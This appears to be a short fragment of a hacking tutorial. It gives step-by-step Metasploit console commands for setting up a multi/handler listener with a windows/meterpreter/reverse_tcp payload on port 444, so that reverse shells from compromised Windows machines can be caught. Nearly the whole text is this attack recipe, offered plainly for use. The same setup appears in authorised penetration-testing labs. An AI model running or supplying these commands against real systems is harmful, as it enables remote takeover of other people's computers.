...
Type msfconsole -q, type use exploit/multi/handler, set payload windows/meterpreter/reverse_tcp, set LHOST (local host ip), set LPORT 444 while creating port enter here. then exploit
